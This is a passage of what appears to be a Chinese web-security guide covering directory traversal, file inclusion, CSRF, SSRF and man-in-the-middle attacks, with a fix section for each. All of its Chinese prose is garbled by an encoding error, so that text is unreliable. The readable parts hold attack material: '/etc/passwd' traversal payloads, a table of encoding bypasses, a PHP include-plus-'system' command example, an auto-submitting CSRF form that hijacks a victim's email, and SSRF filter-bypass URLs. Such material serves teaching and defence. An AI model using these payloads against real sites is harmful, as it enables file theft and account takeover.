æ”»å‡»è€…å¯èƒ½ä½¿ç”¨ç›®å½•éåŽ†æ¥ä¸‹è½½æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ•æ„Ÿä¿¡æ¯å¹¶å¯èƒ½æš´éœ²æ›´å¤šæœåŠ¡å™¨æ¼æ´žã€‚æœ€ç»ˆï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®æœºå¯†ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šä»¥ä¸‹æ˜¯perlè¯­è¨€çš„ç›®å½•éåŽ†ä»£ç ç¤ºä¾‹ï¼Œå…¶ä¸­æ¯ä¸ªç”¨æˆ·çš„ä¸ªäººèµ„æ–™ä¿¡æ¯éƒ½å­˜å‚¨åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”æ‰€æœ‰æ–‡ä»¶éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªç›®å½•ä¸­ã€‚ 123456789my $dataPath = "/users/root/profiles";my $username = param("user");my $profilePath = $dataPath . "/" . $username;open(my $fh, "&lt;$profilePath") || ExitError("profile read error: $profilePath");print "&lt;ul&gt;\n";while (&lt;$fh&gt;) &#123;print "&lt;li&gt;$_&lt;/li&gt;\n";&#125;print "&lt;/ul&gt;\n"; â€‹ æ”»å‡»è€…å¯ä»¥æž„é€ ä»¥ä¸‹payloadè¿›è¡Œæ”»å‡»ï¼Œæ‰“å¼€æ–‡ä»¶åŽï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨è·¯å¾„è§„èŒƒåŒ–æœŸé—´è§£æžâ€œ../â€ï¼Œå¹¶çœŸå®žè®¿é—®æ­¤æ–‡ä»¶ï¼šâ€œ/etc/passwdâ€ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–å¯†ç æ–‡ä»¶çš„å†…å®¹ã€‚ 1/users/root/profiles/../../../etc/passwd æ£€æµ‹æ–¹æ³• æ”»å‡»è€…é€šè¿‡è®¿é—®æ ¹ç›®å½•ï¼Œå‘é€ä¸€ç³»åˆ—â€œ../â€å­—ç¬¦æ¥éåŽ†é«˜å±‚ç›®å½•ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œç”šè‡³ä½¿ç³»ç»Ÿå´©æºƒï¼Œå¹¶ä¸”å°è¯•æ‰¾åˆ°ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶æˆ–è€…ç³»ç»Ÿä¸­å­˜åœ¨çš„æ•æ„Ÿæ–‡ä»¶ã€‚ ä¹Ÿå¯é€šè¿‡åˆ¤æ–­ç½‘ç«™è¯­è¨€ï¼Œå¹¶æ ¹æ®å…¶urlä¸­éƒ¨åˆ†æä¾›çš„å‚æ•°ï¼Œè¿›è¡Œæž„é€ ç›¸å…³çš„è·¯å¾„ä¿¡æ¯ï¼Œå¦‚æ”¶é›†åˆ°ç½‘ç«™ä¸­é—´ä»¶ç‰ˆæœ¬ä¸ºapacheï¼Œåˆ™æƒ³åŠžæ³•æž„é€ ../../../Web-INF/Web.xmlç­‰ï¼Œç„¶åŽæŸ¥çœ‹å…¶æ˜¯å¦å¯è¢«ä¸‹è½½å‡ºæ¥ã€‚éšåŽå¯æž„é€ ä¸‹è½½ç³»ç»Ÿæ–‡ä»¶ã€‚ ç¼–ç æˆ–è€…å¤šé‡ç¼–ç ç»•è¿‡ï¼š 1234567891011ç¼–ç æˆ–å¤šé‡ç¼–ç  | æ˜Žç å†…å®¹ %2e%2e%2f | ../ %2e%2e/ | ../ ..%2f | ../ %2e%2e%5c | ..\ %2e%2e\ | ..\ ..%5c | ..\ %252e%252e%255c | ..\ ..%255c | ..\ ..%c0%af | ../ ..%c1%9c | ..\ ä¿®å¤å»ºè®® é˜²æ­¢æ–‡ä»¶è·¯å¾„éåŽ†æ¼æ´žçš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥å®Œå…¨ä¼ é€’ç»™æ–‡ä»¶ç³»ç»ŸAPIã€‚ éœ€å¯¹ç”¨æˆ·æäº¤çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä¸»è¦æŒ‡è¿‡æ»¤ç›®å½•è·³è½¬ç¬¦â€œ../â€ï¼Œå­—ç¬¦æˆªæ–­ç¬¦ï¼Œdirå‘½ä»¤ç­‰ã€‚ ä¸¥æ ¼æŽ§åˆ¶Webæ ¹ç›®å½•çš„æƒé™ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´žæè¿° æ–‡ä»¶åŒ…å«æ˜¯æŒ‡ç¨‹åºä»£ç åœ¨å¤„ç†åŒ…å«æ–‡ä»¶çš„æ—¶å€™æ²¡æœ‰ä¸¥æ ¼æŽ§åˆ¶ã€‚ä¸»è¦åŒ…æ‹¬æœ¬åœ°æ–‡ä»¶åŒ…å«å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ä¸¤ç§å½¢å¼ï¼Œç”±äºŽå¼€å‘äººå‘˜ç¼–å†™æºç ï¼Œå¼€æ”¾ç€å°†å¯é‡å¤ä½¿ç”¨çš„ä»£ç æ’å…¥åˆ°å•ä¸ªçš„æ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨éœ€è¦çš„æ—¶å€™å°†å®ƒä»¬åŒ…å«åœ¨ç‰¹æ®Šçš„åŠŸèƒ½ä»£ç æ–‡ä»¶ä¸­ï¼Œç„¶åŽåŒ…å«æ–‡ä»¶ä¸­çš„ä»£ç ä¼šè¢«è§£é‡Šæ‰§è¡Œã€‚ç”±äºŽå¹¶æ²¡æœ‰é’ˆå¯¹ä»£ç ä¸­å­˜åœ¨æ–‡ä»¶åŒ…å«çš„å‡½æ•°å…¥å£åšè¿‡æ»¤ï¼Œå¯¼è‡´å®¢æˆ·ç«¯å¯ä»¥æäº¤æ¶æ„æž„é€ è¯­å¥æäº¤ï¼Œå¹¶äº¤ç”±æœåŠ¡å™¨ç«¯è§£é‡Šæ‰§è¡Œã€‚æ–‡ä»¶åŒ…å«æ”»å‡»ä¸­WebæœåŠ¡å™¨æºç é‡Œå¯èƒ½å­˜åœ¨inlcude()æ­¤ç±»æ–‡ä»¶åŒ…å«æ“ä½œå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å®¢æˆ·ç«¯æž„é€ æäº¤æ–‡ä»¶è·¯å¾„ï¼Œæ˜¯è¯¥æ¼æ´žæ”»å‡»æˆåŠŸçš„æœ€ä¸»è¦åŽŸå› ã€‚ æ¼æ´žå±å®³ æ–‡ä»¶åŒ…å«æ¼æ´žä¼šå¯¼è‡´ç”¨æˆ·å¯ä»¥æž„é€ å‚æ•°åŒ…å«è¿œç¨‹ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œå¹¶å¾—åˆ°ç½‘ç«™é…ç½®æˆ–è€…æ•æ„Ÿæ–‡ä»¶ï¼Œè¿›è€ŒèŽ·å–åˆ°æœåŠ¡å™¨æƒé™ï¼Œé€ æˆç½‘ç«™è¢«æ¶æ„åˆ é™¤ï¼Œç”¨æˆ·å’Œäº¤æ˜“æ•°æ®è¢«ç¯¡æ”¹ç­‰ä¸€ç³»åˆ—æ¶æ€§åŽæžœã€‚ å³ä½¿æ²¡æœ‰ä¸Šè½½å’Œæ‰§è¡Œä»£ç çš„èƒ½åŠ›ï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´žä¹Ÿå¯èƒ½å¾ˆå±é™©ã€‚æ”»å‡»è€…ä»ç„¶å¯ä»¥ä½¿ç”¨LFIæ¼æ´žæ‰§è¡Œç›®å½•éåŽ†/è·¯å¾„éåŽ†æ”»å‡»ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šä»¥ä¸‹æ˜¯phpå­˜åœ¨æ–‡ä»¶åŒ…å«çš„é—®é¢˜ä»£ç ï¼Œé€šè¿‡ä½¿ç”¨æä¾›çš„â€™module_nameâ€˜å‚æ•°å¹¶å°†å­—ç¬¦ä¸²â€™/function.phpâ€˜é™„åŠ åˆ°â€™module_nameâ€˜ä¹‹åŽï¼Œå¯ä»¥æž„å»ºæ–‡ä»¶çš„è·¯å¾„ã€‚é€šè¿‡å¯¹ â€˜module_nameâ€™å‚æ•°è¿›è¡Œæž„é€ â€™?module_name=abc/function.phpâ€™ï¼Œå¦‚æžœâ€™function.phpâ€™å†…å®¹æ˜¯â€™ system($_GET[&#39;cmd&#39;]);â€™ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æž„é€ æ¶æ„payload â€˜ ?module_name=abc&amp;cmd=/etc/passwdâ€™ï¼Œæ¥è¯»å–ç›®æ ‡æœåŠ¡å™¨çš„æ•æ„Ÿæ–‡ä»¶ã€‚ 12$dir = $_GET['module_name'];include($dir . "/function.php"); æ£€æµ‹æ–¹æ³• é€šè¿‡ä»£ç å®¡è®¡çš„æ–¹å¼æ£€æŸ¥ä»£ç é‡Œå‡ºçŽ°includeæˆ–requireçš„ä»£ç æ®µï¼› å…¸åž‹çš„æ¦‚å¿µéªŒè¯æ˜¯åŠ è½½passwdæ–‡ä»¶ï¼š 1http://vulnerable_host/preview.php?file=../../../../etc/passwd å¦‚æžœæˆåŠŸæ‰§è¡Œåˆ™ä¼šå›žæ˜¾ä»¥ä¸‹å†…å®¹ï¼š 123456root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinalex:x:500:500:alex:/home/alex:/bin/bashmargo:x:501:501::/home/margo:/bin/bash... ä¿®å¤å»ºè®® ä¸ºé¿å…æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰å’Œè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRFIï¼‰ï¼Œä¿è¯ç”¨æˆ·è¾“å…¥ä¸å¯ä¿¡ã€‚å¦‚æžœéœ€è¦åœ¨ç½‘ç«™æˆ–Webåº”ç”¨ç¨‹åºä»£ç ä¸­åŒ…å«æœ¬åœ°æ–‡ä»¶ï¼Œè¯·ä½¿ç”¨å…è®¸çš„æ–‡ä»¶åå’Œä½ç½®çš„ç™½åå•ã€‚ä½¿ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œç¡®ä¿æ”»å‡»è€…æ— æ³•æ›¿æ¢è¿™äº›æ–‡ä»¶ã€‚ éœ€å¯¹ç”¨æˆ·æäº¤çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä¸»è¦æŒ‡è¿‡æ»¤ç›®å½•è·³è½¬ç¬¦â€œ../â€ï¼Œå­—ç¬¦æˆªæ–­ç¬¦ï¼Œdirå‘½ä»¤ç­‰ã€‚ ä¸¥æ ¼æŽ§åˆ¶Webæ ¹ç›®å½•çš„æƒé™ã€‚ è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ¼æ´žæè¿° CSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼šæ”»å‡»è€…è¯±å¯¼å—å®³è€…è¿›å…¥ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸­ï¼Œå‘è¢«æ”»å‡»ç½‘ç«™å‘é€è·¨ç«™è¯·æ±‚ã€‚åˆ©ç”¨å—å®³è€…åœ¨è¢«æ”»å‡»ç½‘ç«™å·²ç»èŽ·å–çš„æ³¨å†Œå‡­è¯ï¼Œç»•è¿‡åŽå°çš„ç”¨æˆ·éªŒè¯ï¼Œè¾¾åˆ°å†’å……ç”¨æˆ·å¯¹è¢«æ”»å‡»çš„ç½‘ç«™æ‰§è¡ŒæŸé¡¹æ“ä½œçš„ç›®çš„ã€‚ æ¼æ´žå±å®³ èŽ·å¾—ç‰¹æƒæˆ–æ‰¿æ‹…èº«ä»½ï¼›ç»•è¿‡ä¿æŠ¤æœºåˆ¶ï¼›è¯»å–åº”ç”¨æ•°æ®ï¼›ä¿®æ”¹ç”³è¯·æ•°æ®ï¼›DoSæ”»å‡»ï¼šä½¿ç›®æ ‡å´©æºƒï¼Œé€€å‡ºæˆ–é‡æ–°å¯åŠ¨ã€‚ æ”»å‡»è€…å¯ä»¥æˆåŠŸåœ°æ‰§è¡Œä»»ä½•æ“ä½œï¼Œå†³å®šäºŽå—å®³è€…çš„æƒé™ã€‚å¦‚æžœå—å®³è€…æ˜¯ç®¡ç†å‘˜æˆ–ç‰¹æƒç”¨æˆ·ï¼Œåˆ™åŽæžœå¯èƒ½åŒ…æ‹¬èŽ·å¾—å¯¹Webåº”ç”¨ç¨‹åºçš„å®Œå…¨æŽ§åˆ¶-åˆ é™¤æˆ–çªƒå–æ•°æ®ï¼Œå¸è½½äº§å“æˆ–ä½¿ç”¨å®ƒå¯¹äº§å“çš„æ‰€æœ‰è€…å‘èµ·å…¶ä»–æ”»å‡»ã€‚ç”±äºŽæ”»å‡»è€…èŽ·å–äº†å—å®³è€…çš„æƒé™ï¼Œå› æ­¤CSRFçš„å½±å“èŒƒå›´ä»…å—å—å®³è€…çš„ç‰¹æƒé™åˆ¶ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼š â€‹ å—å®³è€…ç™»å½•a.comï¼Œå¹¶ä¿ç•™äº†ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ã€‚ â€‹ æ”»å‡»è€…å¼•è¯±å—å®³è€…è®¿é—®äº†b.comã€‚ â€‹ b.comå‘ a.com å‘é€äº†ä¸€ä¸ªè¯·æ±‚ï¼ša.com/act=xxã€‚æµè§ˆå™¨ä¼šé»˜è®¤æºå¸¦a.comçš„Cookieã€‚ â€‹ a.comæŽ¥æ”¶åˆ°è¯·æ±‚åŽï¼Œå¯¹è¯·æ±‚è¿›è¡ŒéªŒè¯ï¼Œå¹¶ç¡®è®¤æ˜¯å—å®³è€…çš„å‡­è¯ï¼Œè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±å‘é€çš„è¯·æ±‚ã€‚ â€‹ a.comä»¥å—å®³è€…çš„åä¹‰æ‰§è¡Œäº†act=xxã€‚ â€‹ æ”»å‡»å®Œæˆï¼Œæ”»å‡»è€…åœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå†’å……å—å®³è€…ï¼Œè®©a.comæ‰§è¡Œäº†è‡ªå·±å®šä¹‰çš„æ“ä½œã€‚ æ£€æµ‹æ–¹æ³• æ”»å‡»è€…æœ‰ç†ç”±è¯±ä½¿åº”ç”¨ç¨‹åºä¸­å‘ç”ŸæŸç§åŠ¨ä½œã€‚è¿™å¯èƒ½æ˜¯ç‰¹æƒæ“ä½œï¼ˆä¾‹å¦‚ï¼Œä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æƒé™ï¼‰æˆ–å¯¹ç”¨æˆ·ç‰¹å®šæ•°æ®çš„ä»»ä½•æ“ä½œï¼ˆä¾‹å¦‚ï¼Œæ›´æ”¹ç”¨æˆ·è‡ªå·±çš„å¯†ç ï¼‰ã€‚ æ‰§è¡Œè¯¥æ“ä½œæ¶‰åŠå‘å‡ºä¸€ä¸ªæˆ–å¤šä¸ªHTTPè¯·æ±‚ï¼Œå¹¶ä¸”è¯¥åº”ç”¨ç¨‹åºä»…ä¾é ä¼šè¯cookieæ¥æ ‡è¯†å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ã€‚æ²¡æœ‰å…¶ä»–æœºåˆ¶å¯ä»¥è·Ÿè¸ªä¼šè¯æˆ–éªŒè¯ç”¨æˆ·è¯·æ±‚ã€‚ æ‰§è¡Œè¯¥æ“ä½œçš„è¯·æ±‚ä¸åŒ…å«æ”»å‡»è€…æ— æ³•ç¡®å®šæˆ–çŒœæµ‹å…¶å€¼çš„ä»»ä½•å‚æ•°ã€‚ä¾‹å¦‚ï¼Œå½“ä½¿ç”¨æˆ·æ›´æ”¹å¯†ç æ—¶ï¼Œå¦‚æžœæ”»å‡»è€…éœ€è¦çŸ¥é“çŽ°æœ‰å¯†ç çš„å€¼ï¼Œåˆ™è¯¥åŠŸèƒ½ä¸ä¼šå—åˆ°å½±å“ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªåº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªåŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½ä½¿ç”¨æˆ·å¯ä»¥æ›´æ”¹å…¶å¸æˆ·ä¸Šçš„ç”µå­é‚®ä»¶åœ°å€ã€‚ç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œæ—¶ï¼Œå°†å‘å‡ºå¦‚ä¸‹HTTPè¯·æ±‚ï¼š 1234567POST /email/change HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 30Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfEemail=wiener@normal-user.com åœ¨æ»¡è¶³CSRFæ”»å‡»æ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥æž„å»ºåŒ…å«ä»¥ä¸‹HTMLçš„ç½‘é¡µï¼š 12345678910&lt;html&gt; &lt;body&gt; &lt;form action="https://vulnerable-website.com/email/change" method="POST"&gt; &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; å¦‚æžœå—å®³ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µï¼Œåˆ™ä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š æ”»å‡»è€…çš„é¡µé¢å°†è§¦å‘å¯¹æ˜“å—æ”»å‡»çš„ç½‘ç«™çš„HTTPè¯·æ±‚ã€‚ å¦‚æžœç”¨æˆ·ç™»å½•åˆ°æ˜“å—æ”»å‡»çš„ç½‘ç«™ï¼Œåˆ™å…¶æµè§ˆå™¨å°†è‡ªåŠ¨åœ¨è¯·æ±‚ä¸­åŒ…æ‹¬å…¶ä¼šè¯cookieï¼ˆå‡è®¾æœªä½¿ç”¨SameSite cookieï¼‰ã€‚ æ˜“å—æ”»å‡»çš„ç½‘ç«™å°†ä»¥æ­£å¸¸æ–¹å¼å¤„ç†è¯·æ±‚ï¼Œå°†å…¶è§†ä¸ºå—å®³ç”¨æˆ·æå‡ºï¼Œå¹¶æ›´æ”¹å…¶ç”µå­é‚®ä»¶åœ°å€ã€‚ ä¿®å¤å»ºè®® CSRFè‡ªåŠ¨é˜²å¾¡ç­–ç•¥ï¼šåŒæºæ£€æµ‹ï¼ˆOriginå’Œ RefereréªŒè¯ï¼‰ã€‚ åˆ©ç”¨SameSite Cookieå±žæ€§ã€‚ CSRFä¸»åŠ¨é˜²å¾¡æŽªæ–½ï¼šTokenéªŒè¯æˆ–è€…åŒé‡CookieéªŒè¯ä»¥åŠé…åˆSamesite Cookieã€‚ ä¿è¯é¡µé¢çš„å¹‚ç­‰æ€§ï¼ŒåŽç«¯æŽ¥å£ä¸è¦åœ¨GETé¡µé¢ä¸­åšç”¨æˆ·æ“ä½œã€‚ åŸºäºŽç”¨æˆ·äº¤äº’çš„CSRFé˜²å¾¡ï¼šé‡æ–°è®¤è¯ï¼ˆå¯†ç ï¼‰ã€ä¸€æ¬¡æ€§ä»¤ç‰Œã€éªŒè¯ç ã€‚ æœåŠ¡å™¨ç«¯ä¼ªé€ è¯·æ±‚ï¼ˆSSRFï¼‰æ¼æ´žæè¿° SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æž„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚çš„å®‰å…¨æ¼æ´žã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ æ¼æ´žå±å®³ æˆåŠŸåˆ©ç”¨SSRFæ”»å‡»é€šå¸¸ä¼šå¯¼è‡´æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºæœ¬èº«æˆ–åº”ç”¨ç¨‹åºå¯ä»¥ä¸Žä¹‹é€šä¿¡çš„å…¶ä»–åŽç«¯ç³»ç»Ÿä¸Šæœªç»æŽˆæƒçš„æ“ä½œæˆ–å¯¹ç»„ç»‡å†…æ•°æ®çš„è®¿é—®ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒSSRFæ¼æ´žå¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œã€‚ å¯¼è‡´ä¸Žå¤–éƒ¨ç¬¬ä¸‰æ–¹ç³»ç»Ÿå»ºç«‹è¿žæŽ¥çš„SSRFåˆ©ç”¨å¯èƒ½å¯¼è‡´æ¶æ„çš„ç»§ç»­æ”»å‡»ã€‚ æ”»å‡»æ¡ˆä¾‹ æ£€æµ‹æ–¹æ³• ä¿®å¤å»ºè®® ç¦æ­¢è·³è½¬ã€‚ è¿‡æ»¤è¿”å›žä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æžœWebåº”ç”¨æ˜¯åŽ»èŽ·å–æŸä¸€ç§ç±»åž‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›žç»“æžœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›žçš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚ ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äºŽfile://, gopher://, ftp:// ç­‰å¼•èµ·çš„é—®é¢˜ è®¾ç½®URLç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘IPï¼ˆä½¿ç”¨gethostbyname()åˆ¤æ–­æ˜¯å¦ä¸ºå†…ç½‘IPï¼‰ é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttpå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80ã€443ã€8080ã€8090 ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚ é»‘åå•è¿‡æ»¤å™¨ï¼š é˜»æ­¢åŒ…å«ä¸»æœºåï¼ˆå¦‚127.0.0.1å’Œlocalhostï¼‰ã€‚ é˜»æ­¢å†…ç½‘åœ°å€çš„è®¿é—®ï¼ˆå¦‚192.168.x.x/10.x.x.xç­‰ï¼‰ã€‚ ä½¿ç”¨URLç¼–ç æˆ–å¤§å°å†™å˜åŒ–å¯¹é˜»å¡žçš„å­—ç¬¦ä¸²è¿›è¡Œæ··æ·†ã€‚ ç™½åå•è¿‡æ»¤å™¨ï¼š ä½¿ç”¨@å­—ç¬¦åœ¨ä¸»æœºåä¹‹å‰çš„URLä¸­åµŒå…¥å‡­æ®ã€‚ä¾‹å¦‚ï¼šhttps://expected-host@evil-hostã€‚ ä½¿ç”¨è¯¥#å­—ç¬¦æ¥æŒ‡ç¤ºURLç‰‡æ®µã€‚ä¾‹å¦‚ï¼šhttps://evil-host#expected-hostã€‚ åˆ©ç”¨DNSå‘½åå±‚æ¬¡ç»“æž„å°†æ‰€éœ€çš„è¾“å…¥æ”¾å…¥æ‚¨æŽ§åˆ¶çš„æ ‡å‡†DNSåç§°ä¸­ã€‚ä¾‹å¦‚ï¼šhttps://expected-host.evil-hostã€‚ ä½¿ç”¨URLç¼–ç å­—ç¬¦æ¥æ··æ·†URLè§£æžä»£ç ã€‚å¦‚æžœå®žçŽ°è¿‡æ»¤å™¨çš„ä»£ç ä¸Žæ‰§è¡ŒåŽç«¯HTTPè¯·æ±‚çš„ä»£ç ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†URLç¼–ç çš„å­—ç¬¦ï¼Œåˆ™è¿™ç‰¹åˆ«æœ‰ç”¨ã€‚ ä¸­é—´äººæ”»å‡»æ¼æ´žæè¿° ä¸­é—´äººæ”»å‡»ï¼ˆMan-in-the-Middle Attack, MITMï¼‰æ˜¯ä¸€ç§ç”±æ¥å·²ä¹…çš„ç½‘ç»œå…¥ä¾µæ‰‹æ®µï¼Œå¹¶ä¸”å½“ä»Šä»ç„¶æœ‰ç€å¹¿æ³›çš„å‘å±•ç©ºé—´ï¼Œå¦‚SMBä¼šè¯åŠ«æŒã€DNSæ¬ºéª—ç­‰æ”»å‡»éƒ½æ˜¯å…¸åž‹çš„MITMæ”»å‡»ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ‰€è°“çš„MITMæ”»å‡»å°±æ˜¯é€šè¿‡æ‹¦æˆªæ­£å¸¸çš„ç½‘ç»œé€šä¿¡æ•°æ®ï¼Œå¹¶è¿›è¡Œæ•°æ®ç¯¡æ”¹å’Œå—…æŽ¢ï¼Œè€Œé€šä¿¡çš„åŒæ–¹å´æ¯«ä¸çŸ¥æƒ…ã€‚å½“é»‘å®¢å°†è‡ªå·±æ’å…¥å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„é€šä¿¡ä¹‹é—´æ—¶ï¼Œå°±ä¼šå‘ç”ŸMitMæ”»å‡»ã€‚ ä¸­é—´äººæ”»å‡»å¸¸è§ç±»åˆ«ï¼šIPæ¬ºéª—ã€DNSæ¬ºéª—ã€ARPæ¬ºéª—ã€HTTPSæ¬ºéª—ã€SSLåŠ«æŒã€DNSåŠ«æŒã€ç”µå­é‚®ä»¶åŠ«æŒã€WIFIçªƒå¬ã€çªƒå–æµè§ˆå™¨Cookieã€SSLå‰¥ç¦»ã€‚ æ¼æ´žå±å®³ ä¸€æ—¦æ”»å‡»è€…æ‰¾åˆ°äº†æ˜“å—æ”»å‡»çš„è·¯ç”±å™¨ï¼Œä»–ä»¬ä¾¿å¯ä»¥éƒ¨ç½²å·¥å…·æ¥æ‹¦æˆªå’Œè¯»å–å—å®³è€…çš„ä¼ è¾“æ•°æ®ã€‚ç„¶åŽï¼Œæ”»å‡»è€…è¿˜å¯ä»¥å°†å…¶å·¥å…·æ’å…¥å—å®³è€…çš„è®¡ç®—æœºå’Œç”¨æˆ·è®¿é—®çš„ç½‘ç«™ä¹‹é—´ï¼Œä»¥æ•èŽ·ç™»å½•å‡­æ®ï¼Œé“¶è¡Œä¿¡æ¯å’Œå…¶ä»–ä¸ªäººä¿¡æ¯ã€‚ æˆåŠŸåˆ©ç”¨ä¸­é—´äººæ”»å‡»çš„æ”»å‡»è€…å¯ä»¥çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€æŒ‚é©¬ç­‰ã€‚ æ”»å‡»æ¡ˆä¾‹ åœºæ™¯1ï¼šä¼šè¯åŠ«æŒï¼š åœ¨è¿™ç§MitMæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åŠ«æŒäº†å—ä¿¡ä»»çš„å®¢æˆ·ç«¯å’Œç½‘ç»œæœåŠ¡å™¨ä¹‹é—´çš„ä¼šè¯ã€‚å½“æœåŠ¡å™¨ç»§ç»­ä¼šè¯æ—¶ï¼Œæ”»å‡»è®¡ç®—æœºå°†å…¶IPåœ°å€æ›¿æ¢ä¸ºå—ä¿¡ä»»çš„å®¢æˆ·ç«¯ï¼Œè®¤ä¸ºå®ƒæ­£åœ¨ä¸Žå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»å¯èƒ½ä¼šåƒè¿™æ ·å±•å¼€ï¼š 1.å®¢æˆ·ç«¯è¿žæŽ¥åˆ°æœåŠ¡å™¨ã€‚ 2.æ”»å‡»è€…çš„è®¡ç®—æœºæŽ§åˆ¶äº†å®¢æˆ·ç«¯ã€‚ 3.æ”»å‡»è€…çš„è®¡ç®—æœºå°†å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨æ–­å¼€è¿žæŽ¥ã€‚ 4.æ”»å‡»è€…çš„è®¡ç®—æœºç”¨å…¶è‡ªå·±çš„IPåœ°å€æ›¿æ¢å®¢æˆ·ç«¯çš„IPåœ°å€ï¼Œå¹¶æ¬ºéª—å®¢æˆ·ç«¯çš„åºåˆ—å·ã€‚ 5.æ”»å‡»è€…çš„è®¡ç®—æœºç»§ç»­ä¸ŽæœåŠ¡å™¨å¯¹è¯ï¼Œå¹¶ä¸”æœåŠ¡å™¨è®¤ä¸ºæœåŠ¡å™¨ä»åœ¨ä¸Žå®¢æˆ·ç«¯é€šä¿¡ã€‚ æ£€æµ‹æ–¹æ³• ä¸­é—´äººæ”»å‡»å¸¸è§æ”»å‡»å·¥å…·ï¼š dsniff â€”â€” ä¸€ä¸ªå®žçŽ°SSHå’ŒSSLä¸­é—´äººæ”»å‡»çš„å·¥å…· Cain and Abel â€”â€” 